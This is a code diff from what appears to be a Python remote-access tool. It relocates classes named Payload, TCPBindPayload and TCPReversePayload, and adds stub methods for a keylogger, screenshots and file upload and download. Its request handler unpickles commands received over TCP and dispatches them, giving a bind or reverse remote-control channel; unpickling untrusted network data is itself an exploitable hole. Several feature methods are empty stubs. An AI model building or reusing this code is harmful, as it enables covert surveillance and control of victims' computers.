@@ -9,88 +9,6 @@ from .. import sock
 from .. import rpc
 
 
-class Payload(rpc.RPCDispatcher):
-
-    def register_file_service(self, mode):
-        pass
-
-    def register_keylogger(self):
-        pass
-
-
-class TCPPayloadRequestHandler(socketserver.BaseRequestHandler):
-    Connection = sock.TCPConnection
-    marshaller = pickle
-
-    def setup(self):
-        self.payload = self.server
-        self.connection = self.Connection(self.request)
-
-    def handle(self):
-        try:
-            while True:
-                data = self.recv()
-                func_name, args, kwargs = self.loads(data)
-                try:
-                    r = self.dispatch(func_name, args, kwargs)
-                except Exception as e:
-                    self.send(self.dumps(e))
-                else:
-                    self.send(self.dumps(r))
-        except EOFError:
-            pass
-
-    def send(self, data):
-        self.connection.send(data)
-
-    def recv(self):
-        return self.connection.recv()
-
-    def loads(self, data):
-        return self.marshaller.loads(data)
-
-    def dumps(self, obj):
-        return self.marshaller.dumps(obj)
-
-    def dispatch(self, func_name, args, kwargs):
-        return self.payload.dispatch(func_name, args, kwargs)
-
-
-class TCPPayload(Payload):
-    RequestHandler = TCPPayloadRequestHandler
-
-    def __init__(self, RequestHandler=None):
-        if RequestHandler is not None:
-            self.RequestHandler = RequestHandler
-
-    def handle_request(self, request):
-        client_address = request.getpeername()
-        return self.RequestHandler(
-            request,
-            client_address,
-            self,
-        )
-
-
-class TCPBindPayload(socketserver.TCPServer, TCPPayload):
-
-    def __init__(self, server_address, RequestHandler=None):
-        TCPPayload.__init__(self,
-            RequestHandler=RequestHandler,
-        )
-        socketserver.TCPServer.__init__(self,
-            server_address,
-            self.RequestHandler,
-        )
-
-
-class TCPReversePayload(sock.TCPClient, TCPPayload):
-
-    def __init__(self, addr, retry_interval=1):
-        TCPPayload.__init__(self)
-        sock.TCPClient.__init__(self)
-
-
 def uname():
     import platform
     return platform.uname()
@@ -176,4 +94,92 @@ class FileWriter:
         data = base64.urlsafe_b64decode(data)
         f.write(data)
         f.flush()
+
+
+class Payload(rpc.RPCDispatcher):
+
+    def register_file_upload(self):
+        pass
+
+    def register_file_download(self):
+        pass
+
+    def register_keylogger(self):
+        pass
+
+    def register_screenshot(self):
+        pass
+
+
+class TCPPayloadRequestHandler(socketserver.BaseRequestHandler):
+    Connection = sock.TCPConnection
+    marshaller = pickle
+
+    def setup(self):
+        self.payload = self.server
+        self.connection = self.Connection(self.request)
+
+    def handle(self):
+        try:
+            while True:
+                data = self.recv()
+                func_name, args, kwargs = self.loads(data)
+                try:
+                    r = self.dispatch(func_name, args, kwargs)
+                except Exception as e:
+                    self.send(self.dumps(e))
+                else:
+                    self.send(self.dumps(r))
+        except EOFError:
+            pass
+
+    def send(self, data):
+        self.connection.send(data)
+
+    def recv(self):
+        return self.connection.recv()
+
+    def loads(self, data):
+        return self.marshaller.loads(data)
+
+    def dumps(self, obj):
+        return self.marshaller.dumps(obj)
+
+    def dispatch(self, func_name, args, kwargs):
+        return self.payload.dispatch(func_name, args, kwargs)
+
+
+class TCPPayload(Payload):
+    RequestHandler = TCPPayloadRequestHandler
+
+    def __init__(self, RequestHandler=None):
+        if RequestHandler is not None:
+            self.RequestHandler = RequestHandler
+
+    def handle_request(self, request):
+        client_address = request.getpeername()
+        return self.RequestHandler(
+            request,
+            client_address,
+            self,
+        )
+
+
+class TCPBindPayload(socketserver.TCPServer, TCPPayload):
+
+    def __init__(self, server_address, RequestHandler=None):
+        TCPPayload.__init__(self,
+            RequestHandler=RequestHandler,
+        )
+        socketserver.TCPServer.__init__(self,
+            server_address,
+            self.RequestHandler,
+        )
+
+
+class TCPReversePayload(sock.TCPClient, TCPPayload):
+
+    def __init__(self, addr, retry_interval=1):
+        TCPPayload.__init__(self)
+        sock.TCPClient.__init__(self)
 
